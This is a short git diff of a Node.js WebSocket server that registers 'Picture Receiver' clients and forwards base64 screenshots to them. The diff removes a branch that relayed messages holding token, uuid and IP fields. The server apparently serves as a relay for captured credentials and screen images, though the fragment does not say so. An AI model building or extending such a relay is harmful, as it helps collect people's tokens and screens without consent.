@@ -46,17 +46,11 @@ wss.on("close", () => {
 function generateUniqueID() {
     return Math.random().toString(36).substr(2, 9);
 }
-
-
+//hello
 function handleMessage(ws, data, userID) {
     try {
         const messageData = JSON.parse(data);
-        
-        // Check if the data matches the format shown in the image
-        if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-            // If it matches, only broadcast to picture receivers
-            broadcastToPictureReceivers(messageData);
-        } else if (messageData.command === 'Picture Receiver') {
+        if (messageData.command === 'Picture Receiver') {
             pictureReceivers.set(userID, ws);
         } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
             broadcastToPictureReceivers({
